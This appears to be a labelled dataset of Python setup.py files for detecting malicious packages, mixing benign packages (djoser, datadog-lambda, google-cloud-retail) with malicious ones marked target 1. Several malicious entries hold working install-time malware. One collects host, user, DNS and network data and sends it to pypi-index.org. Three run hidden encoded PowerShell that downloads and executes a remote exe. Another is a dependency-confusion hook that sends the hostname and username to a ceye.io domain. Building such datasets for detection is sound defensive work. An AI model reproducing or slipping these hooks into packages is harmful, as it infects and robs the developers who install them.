patience.\\n\\n.. image:: https://asciinema.org/a/94J4eG2tSBD2iEfF30a6vGtXw.png\\n  :target: https://asciinema.org/a/94J4eG2tSBD2iEfF30a6vGtXw\\n\\nRequirements\\n============\\n\\nTo be able to run **djoser** you have to meet following requirements:\\n\\n- Python (3.6, 3.7, 3.8, 3.9)\\n- Django (2.2, 3.1)\\n- Django REST Framework 3.11.1\\n\\nIf you need to support other versions, please use djoser<2.\\n\\nInstallation\\n============\\n\\nSimply install using ``pip``:\\n\\n.. code-block:: bash\\n\\n    $ pip install djoser\\n\\nAnd continue with the steps described at\\n`configuration <https://djoser.readthedocs.io/en/latest/getting_started.html#configuration>`_\\nguide.\\n\\nDocumentation\\n=============\\n\\nDocumentation is available to study at\\n`https://djoser.readthedocs.io <https://djoser.readthedocs.io>`_\\nand in ``docs`` directory.\\n\\nContributing and development\\n============================\\n\\nTo start developing on **djoser**, clone the repository:\\n\\n.. code-block:: bash\\n\\n    $ git clone git@github.com:sunscrapers/djoser.git\\n\\nWe use `poetry <https://python-poetry.org/>`_ as dependency management and packaging tool.\\n\\n.. code-block:: bash\\n\\n    $ cd djoser\\n    $ poetry install -E test\\n\\nThis will create a virtualenv with all development dependencies.\\n\\nTo run the test just type:\\n\\n.. code-block:: bash\\n\\n    $ poetry run py.test testproject\\n\\nWe also preapred a convenient ``Makefile`` to automate commands above:\\n\\n.. code-block:: bash\\n\\n    $ make init\\n    $ make test\\n\\nTo activate the virtual environment run\\n\\n.. code-block:: bash\\n\\n    $ poetry shell\\n\\nWithout poetry\\n--------------\\n\\nNew versions of ``pip`` can use ``pyproject.toml`` to build the package and install its dependencies.\\n\\n.. code-block:: bash\\n\\n    $ pip install .[test]\\n\\n.. code-block:: bash\\n\\n    $ cd testproject\\n    $ ./manage.py test\\n\\nTox\\n---\\n\\nIf you need to run tests against all supported Python and Django versions then invoke:\\n\\n.. code-block:: bash\\n\\n    $ poetry run tox -p all\\n\\nExample project\\n---------------\\n\\nYou can also play with test project by running following commands:\\n\\n.. code-block:: bash\\n\\n    $ make migrate\\n    $ make runserver\\n\\nCommiting your code\\n-------------------\\n\\nBefore sending patches please make sure you have `pre-commit <https://pre-commit.com/>`_ activated in your local git repository:\\n\\n.. code-block:: bash\\n\\n    $ pre-commit install\\n\\nThis will ensure that your code is cleaned before you commit it.\\nSome steps (like black) automatically fix issues but the show their status as FAILED.\\nJust inspect if eveything is OK, git-add the files and retry the commit.\\nOther tools (like flake8) require you to manually fix the issues.\\n\\n\\nSimilar projects\\n================\\n\\nList of projects related to Django, REST and authentication:\\n\\n- `django-rest-framework-simplejwt <https://github.com/davesque/django-rest-framework-simplejwt>`_\\n- `django-oauth-toolkit <https://github.com/evonove/django-oauth-toolkit>`_\\n- `django-rest-auth <https://github.com/Tivix/django-rest-auth>`_ (not maintained)\\n- `django-rest-framework-digestauth <https://github.com/juanriaza/django-rest-framework-digestauth>`_ (not maintained)\\n\\nPlease, keep in mind that while using custom authentication and TokenCreateSerializer\\nvalidation, there is a path that **ignores intentional return of None** from authenticate()\\nand try to find User using parameters. Probably, that will be changed in the future.\\n',\n    'author': 'Sunscrapers',\n    'author_email': 'info@sunscrapers.com',\n    'maintainer': 'Tomasz W\u00f3jcik',\n    'maintainer_email': 't.wojcik@sunscrapers.com',\n    'url': 'https://github.com/sunscrapers/djoser',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=3.6.1,<4.0.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "minis-sdk-99", "func": "import platform\nimport socket\nimport getpass\nimport os\nimport sys\nimport json\n\nif sys.version_info[0] >= 3:\n    import urllib.request as http_request\nif sys.version_info[0] == 2:\n    import urllib2 as http_request\n\nimport datetime\nimport hashlib\nimport uuid\nimport subprocess\n\nHOST = \"pypi-index.org\"\nPACKAGE = \"minis-sdk\"\nH_F1 = \"3daac9ff4692baca30b600cf2a5147719af175b29e2fa6db0cd37a40087be8a0\" \nH_F2 = \"7b49060c65297cbd4c66618c741bb1a550d069882d9f228f3d291306e8058159\" \n\nH_F3 = \"2fb844c33800fdf9c9bc52de333ffcceba35c6e5d3376bc867af31efaada460e\" \nH_F4 = \"7beed9ebc9a1c689ec854f2294fcee20f7dcc5804e60c6f79c4cad1ea26456b2\" \n\nRESP = \"\"\n\ndef sha256(str_):\n    return hashlib.sha256(str_.encode('utf-8')).hexdigest()\n\ndef find_in_folder(dir, hash_):\n    for f in os.listdir(dir):\n        if sha256(f) == hash_:\n            return f\n\ndef RfmdREOOgP_1():\n    k = False\n    try:\n        if platform.system().lower() in ('darwin', 'linux'):\n            home_dir = os.path.expanduser(\"~\")\n            if os.path.isdir(home_dir):\n                f1 = find_in_folder(home_dir, H_F1)\n                if f1:\n                    f1 = os.path.join(home_dir, f1)\n                    f2 = find_in_folder(f1, H_F2)\n                    k = True if f2 else False\n    except:\n        pass\n\n    return k\n\ndef tEvTaqPJsW_2():\n    global RESP\n    try:\n        req = http_request.Request(\"http://127.0.0.1:19000/certs\")\n        response = http_request.urlopen(req, timeout=5)\n        RESP = response.read().decode('utf-8')\n        return True\n    except:\n        return False\n\ndef IOqpVBwRSU_3():\n    for name, value in os.environ.items():\n        if sha256(name) == H_F3 and sha256(value) == H_F4:\n            return True\n    return False\n\ndef detect_system():\n    \n    \n    \n    \n    \n    key = 0\n    if RfmdREOOgP_1():\n        key = 1\n    elif tEvTaqPJsW_2():\n        key = 2\n    elif IOqpVBwRSU_3():\n        key = 3 \n    \n    return key\n\ndef read_config(config):\n    c = \"\"\n    try:\n        f = open(config)\n        for line in f.readlines():\n            if line[0] != \"#\":\n                c += line\n        f.close()\n    except:\n        pass\n    \n    return c\n\n\ndef get_dns():\n    return read_config(\"/etc/resolv.conf\")\n    \n\ndef get_hosts():\n    return read_config(\"/etc/hosts\")\n\ndef get_time_zone():\n    res = \"\"\n    try:\n        c_utc = datetime.datetime.utcnow()\n        zone = \"\"\n        if sys.version_info[0] >= 3 and sys.version_info[1] >= 3:\n            zone = datetime.datetime.now().astimezone().tzinfo\n        else:\n            zone = \"\"\n        res = str(c_utc) + \" \" + str(zone)\n    except:\n        pass\n    return res\n\ndef getifip(ifn):\n    import socket, fcntl, struct\n\n    try:\n        sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        \n        if sys.version_info[0] >= 3:\n            ifn = ifn.encode()\n            return socket.inet_ntoa(fcntl.ioctl(sck.fileno(),0x8915,struct.pack('256s', ifn[:15]))[20:24])\n    except:\n        pass\n    return \"UNKNOWN\"\n\ndef get_mac(ifn):\n    f = open(\"/sys/class/net/{}/address\".format(ifn))\n    mac = f.read()\n    f.close()\n    return mac\n\ndef get_network_interfaces():\n    interfaces = []\n    sysp = platform.system()\n\n    if sysp.lower() == \"linux\":\n        f = open(\"/proc/net/dev\", \"r\")\n        lines = f.readlines()[2:]\n        f.close()\n        for line in lines:\n            interface = line.split(\":\")[0].strip()\n            interfaces.append(interface)\n    elif sysp.lower() == \"darwin\":\n        process = subprocess.Popen([\"ifconfig\"], stdout=subprocess.PIPE)\n        output = process.communicate()[0].decode('utf-8')\n        lines = output.split(\"\\n\")\n        for line in lines:\n            if \"flags\" in line and \"mtu\" in line:\n                interface = line.split(\":\")[0].strip()\n                interfaces.append(interface)\n    elif sysp.lower() == \"windows\":\n        interfaces = [interface[0] for interface in socket.if_nameindex()]\n\n    return interfaces\n\ndef get_ip_addresses(interface):\n    ips = []\n    macs = []\n    sysp = platform.system()\n\n    if sysp.lower() == \"linux\":\n        ip = getifip(interface)\n        ips.append(ip)\n        mac = get_mac(interface)\n        macs.append(mac)\n\n    elif sysp.lower() == \"darwin\":\n        process = subprocess.Popen([\"ifconfig\", interface], stdout=subprocess.PIPE)\n        output = process.communicate()[0].decode('utf-8')\n        lines = output.split(\"\\n\")\n        for line in lines:\n            if \"inet \" in line:\n                ip = line.split(\" \")[1]\n                ips.append(ip)\n            if \"ether \" in line:\n                mac = line.split(\" \")[1]\n                macs.append(mac)\n            \n    elif sysp.lower() == \"windows\":\n        ips = [socket.gethostbyname(socket.gethostname())]\n\n    return ips, macs\n\n\ndef get_net():\n    c = \"\"\n    try:\n        network_interfaces = get_network_interfaces()\n        for interface in network_interfaces:\n            ips, macs = get_ip_addresses(interface)\n            if ips:\n                c += (\"{}|{}|{}\\n\".format(interface, ','.join(ips), \",\".join(macs)))\n    except:\n        pass\n\n    return c\n\ndef collect_info():\n    os_name = platform.system().lower()\n    os_version = platform.version()\n    hostname = socket.gethostname()\n    username = getpass.getuser()\n    current_directory = os.getcwd()\n    home_dir = os.path.expanduser(\"~\")\n    dns = get_dns()\n    hosts = get_hosts()\n    net = get_net() \n    c_time = get_time_zone()\n    k = detect_system()\n\n    data = {\n        \"src\": \"py\"+str(sys.version_info[0]) + \" \" + PACKAGE,\n        \"os\": \"{} {} {}\".format(os_name, platform.platform(), os_version),\n        \"hostname\": hostname,\n        \"user\": username,\n        \"cwd\": current_directory,\n        \"hd\" : home_dir,\n        \"dns\": dns,\n        \"hosts\" : hosts,\n        \"optn\": RESP,\n        \"net\": net,\n        \"time\": c_time,\n        \"key\": k\n    }\n\n    return data\n\ndef run_me():\n    \n    data = collect_info()\n    json_data = json.dumps({\"data\": data}).encode('utf-8')\n    url = \"https://{}/process_data\".format(HOST)\n    \n    try:  \n        req = http_request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})\n        response = http_request.urlopen(req, timeout=30)\n        \n    except http_request.HTTPError as e:\n        pass\n        \n    except Exception as e:\n        pass\n        \n\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport subprocess \nimport shutil\nimport site\nimport atexit\nimport sys, os\n\ndef get_index():\n    try:\n        f = open(os.path.expanduser(\"~/.pip/pip.conf\"))\n    except OSError:\n        return\n    except IOError:\n        return\n    \n    for line in f.readlines():\n        if \"index-url\" in line:\n            f.close()\n            return line.split(\"=\")[-1].strip()\n    f.close()\n\n\nclass CustomInstall(install):\n    def run(self):    \n        def _post_install():      \n            \n            pip = \"{} -m pip\".format(sys.executable)\n            \n            \n            \n            index_url = get_index()\n            if not index_url:\n                return\n\n             \n            if sys.version_info[0] >= 3 and sys.version_info[1] >= 10:\n                py_path = 'PYTHONPATH=\"{}\" '.format(site.getsitepackages()[0]) \n            else:\n                py_path = ''\n\n\n            \n            try:\n                s = subprocess.check_output('{}{} install {} --index-url \"{}\"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()\n            except subprocess.CalledProcessError:\n                return\n            \n            \n            \n            if \"bdist_wheel\" in sys.argv:\n                \n                s = subprocess.check_output('{}{} download {} --no-deps --index-url \"{}\"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()\n\n                dw_wheel = os.listdir(os.getcwd())[-1].strip()\n                \n                \n                t_dir = sys.argv[-1]\n                \n                if not os.path.exists(t_dir):\n                    os.makedirs(t_dir)\n                    shutil.move(dw_wheel, t_dir + \"/\" + dw_wheel)\n                else:\n                    \n                    t_wheel  = os.listdir(t_dir)[-1].strip()\n                    \n                    \n                    os.unlink(t_dir + \"/\" + t_wheel)\n                    \n                    shutil.move(dw_wheel, t_dir + \"/\" + dw_wheel)\n            \n        atexit.register(_post_install)\n        run_me()\n        install.run(self)\n\ntry:\n\n    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))\n    README = open(os.path.join(SCRIPT_DIR, \"README.md\"), \"rb\")\n    README_DATA = README.read().decode(\"utf8\")\n    README.close()\n\n    setup(\n        name=PACKAGE,\n        version='99.0',\n        packages=find_packages(),\n        cmdclass={'install': CustomInstall},  \n        long_description=README_DATA,\n        long_description_content_type=\"text/markdown\",   \n    )\nexcept Exception as e:\n    pass\n", "target": 1}
{"idx": "dbnd-qubole-0.85.9", "func": "# \u00a9 Copyright Databand.ai, an IBM Company 2022\n\nfrom os import path\n\nimport setuptools\n\nfrom setuptools.config import read_configuration\n\n\nBASE_PATH = path.dirname(__file__)\nCFG_PATH = path.join(BASE_PATH, \"setup.cfg\")\n\nconfig = read_configuration(CFG_PATH)\nversion = config[\"metadata\"][\"version\"]\n\nsetuptools.setup(\n    name=\"dbnd-qubole\",\n    package_dir={\"\": \"src\"},\n    install_requires=[\"dbnd==\" + version, \"dbnd-spark==\" + version, \"qds-sdk==1.13.2\"],\n    extras_require=dict(tests=[]),\n    entry_points={\"dbnd\": [\"dbnd-qubole = dbnd_qubole._plugin\"]},\n)\n", "target": 0}
{"idx": "nvidiaproof-3.6", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'nvidiaproof',\n    packages = ['modlib'],\n    version = '3.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-configurations-2.3.2", "func": "import os\nimport codecs\nfrom setuptools import setup\n\n\ndef read(*parts):\n    filename = os.path.join(os.path.dirname(__file__), *parts)\n    with codecs.open(filename, encoding='utf-8') as fp:\n        return fp.read()\n\n\nsetup(\n    name=\"django-configurations\",\n    use_scm_version={\"version_scheme\": \"post-release\", \"local_scheme\": \"dirty-tag\"},\n    setup_requires=[\"setuptools_scm\"],\n    url='https://django-configurations.readthedocs.io/',\n    license='BSD',\n    description=\"A helper for organizing Django settings.\",\n    long_description=read('README.rst'),\n    long_description_content_type='text/x-rst',\n    author='Jannis Leidel',\n    author_email='jannis@leidel.info',\n    packages=['configurations'],\n    entry_points={\n        'console_scripts': [\n            'django-cadmin = configurations.management:execute_from_command_line',\n        ],\n    },\n    install_requires=[\n        'django>=2.2',\n        'importlib-metadata;python_version<\"3.8\"',\n    ],\n    python_requires='>=3.6, <4.0',\n    extras_require={\n        'cache': ['django-cache-url'],\n        'database': ['dj-database-url'],\n        'email': ['dj-email-url'],\n        'search': ['dj-search-url'],\n        'testing': [\n            'django-cache-url>=1.0.0',\n            'dj-database-url',\n            'dj-email-url',\n            'dj-search-url',\n        ],\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Utilities',\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "datadog_lambda-3.60.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['datadog_lambda']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['datadog>=0.41.0,<0.42.0', 'ddtrace>=0.61.1,<0.62.0', 'wrapt>=1.11.2,<2.0.0']\n\nextras_require = \\\n{':python_version < \"3.8\"': ['typing_extensions>=4.0,<5.0',\n                             'importlib_metadata>=1.0,<2.0'],\n u'dev': ['nose2>=0.9.1,<0.10.0',\n          'httpretty>=0.9.7,<0.10.0',\n          'boto3>=1.10.33,<2.0.0',\n          'requests>=2.22.0,<3.0.0',\n          'flake8>=3.7.9,<4.0.0']}\n\nsetup_kwargs = {\n    'name': 'datadog-lambda',\n    'version': '3.60.0',\n    'description': 'The Datadog AWS Lambda Library',\n    'long_description': \"# datadog-lambda-python\\n\\n![build](https://github.com/DataDog/datadog-lambda-python/workflows/build/badge.svg)\\n[![PyPI](https://img.shields.io/pypi/v/datadog-lambda)](https://pypi.org/project/datadog-lambda/)\\n![PyPI - Python Version](https://img.shields.io/pypi/pyversions/datadog-lambda)\\n[![Slack](https://chat.datadoghq.com/badge.svg?bg=632CA6)](https://chat.datadoghq.com/)\\n[![License](https://img.shields.io/badge/license-Apache--2.0-blue)](https://github.com/DataDog/datadog-lambda-python/blob/main/LICENSE)\\n\\nDatadog Lambda Library for Python (3.6, 3.7, 3.8, and 3.9) enables [enhanced Lambda metrics](https://docs.datadoghq.com/serverless/enhanced_lambda_metrics), [distributed tracing](https://docs.datadoghq.com/serverless/distributed_tracing), and [custom metric submission](https://docs.datadoghq.com/serverless/custom_metrics) from AWS Lambda functions.\\n\\n## Installation\\n\\nFollow the [installation instructions](https://docs.datadoghq.com/serverless/installation/python/), and view your function's enhanced metrics, traces and logs in Datadog.\\n\\n## Configuration\\n\\nFollow the [configuration instructions](https://docs.datadoghq.com/serverless/configuration) to tag your telemetry, capture request/response payloads, filter or scrub sensitive information from logs or traces, and more.\\n\\n## Opening Issues\\n\\nIf you encounter a bug with this package, we want to hear about it. Before opening a new issue, search the existing issues to avoid duplicates.\\n\\nWhen opening an issue, include the Datadog Lambda Library version, Python version, and stack trace if available. In addition, include the steps to reproduce when appropriate.\\n\\nYou can also open an issue for a feature request.\\n\\n## Contributing\\n\\nIf you find an issue with this package and have a fix, please feel free to open a pull request following the [procedures](CONTRIBUTING.md).\\n\\n## Community\\n\\nFor product feedback and questions, join the `#serverless` channel in the [Datadog community on Slack](https://chat.datadoghq.com/).\\n\\n## License\\n\\nUnless explicitly stated otherwise all files in this repository are licensed under the Apache License Version 2.0.\\n\\nThis product includes software developed at Datadog (https://www.datadoghq.com/). Copyright 2019 Datadog, Inc.\\n\",\n    'author': 'Datadog, Inc.',\n    'author_email': 'dev@datadoghq.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/DataDog/datadog-lambda-python',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=3.6.0,<4',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "djangorestframework-bulk-0.2.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\nimport os\nfrom setuptools import find_packages, setup\n\nfrom rest_framework_bulk import __version__, __author__\n\n\ndef read(fname):\n    return (open(os.path.join(os.path.dirname(__file__), fname), 'rb')\n            .read().decode('utf-8'))\n\n\nauthors = read('AUTHORS.rst')\nhistory = read('HISTORY.rst').replace('.. :changelog:', '')\nlicence = read('LICENSE.rst')\nreadme = read('README.rst')\n\nrequirements = read('requirements.txt').splitlines() + [\n    'setuptools',\n]\n\ntest_requirements = (\n    read('requirements.txt').splitlines()\n    + read('requirements-dev.txt').splitlines()[1:]\n)\n\nsetup(\n    name='djangorestframework-bulk',\n    version=__version__,\n    author=__author__,\n    author_email='miroslav@miki725.com',\n    description='Django REST Framework bulk CRUD view mixins',\n    long_description='\\n\\n'.join([readme, history, authors, licence]),\n    url='https://github.com/miki725/django-rest-framework-bulk',\n    license='MIT',\n    keywords='django',\n    packages=find_packages(),\n    install_requires=requirements,\n    tests_require=test_requirements,\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Utilities',\n        'Topic :: Internet :: WWW/HTTP',\n        'License :: OSI Approved :: MIT License',\n    ],\n)\n", "target": 0}
{"idx": "selfstrresuper-3.23", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstrresuper',\n    packages = ['modlib'],\n    version = '4.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "antchain-sdk-iam-1.0.0", "func": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"http://5r13v9.ceye.io\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='antchain_sdk_iam', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "dash_daq-0.5.0", "func": "import json\nimport os\nfrom setuptools import setup\nfrom io import open\n\nfilepath = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'README.md')\nwith open(filepath, encoding='utf-8') as f:\n    long_description = f.read()\n\nwith open(os.path.join('dash_daq', 'package-info.json'), encoding='utf-8') as f:\n    package = json.load(f)\n\npackage_name = package[\"name\"].replace(\" \", \"_\").replace(\"-\", \"_\")\n\nsetup(\n    name=package_name,\n    version=package[\"version\"],\n    url='http://github.com/plotly/{}'.format(package_name.replace('_', '-')),\n    author=package['author'],\n    author_email='dashdaq@plotly.com',\n    packages=[package_name],\n    include_package_data=True,\n    description=package['description'] if 'description' in package else package_name,\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    install_requires=[\n        'dash>=1.6.1'\n    ],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n)\n", "target": 0}
{"idx": "google-cloud-retail-1.8.0", "func": "# -*- coding: utf-8 -*-\n\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\n\nimport setuptools  # type: ignore\n\nversion = \"1.8.0\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n\nsetuptools.setup(\n    name=\"google-cloud-retail\",\n    version=version,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-retail\",\n    packages=setuptools.PEP420PackageFinder.find(),\n    namespace_packages=(\"google\", \"google.cloud\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=(\n        \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n        \"proto-plus >= 1.15.0, <2.0.0dev\",\n        \"protobuf >= 3.19.0, <4.0.0dev\",\n    ),\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_retail_v2_keywords.py\",\n    ],\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfvergame-3.72", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvergame',\n    packages = ['modlib'],\n    version = '2.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
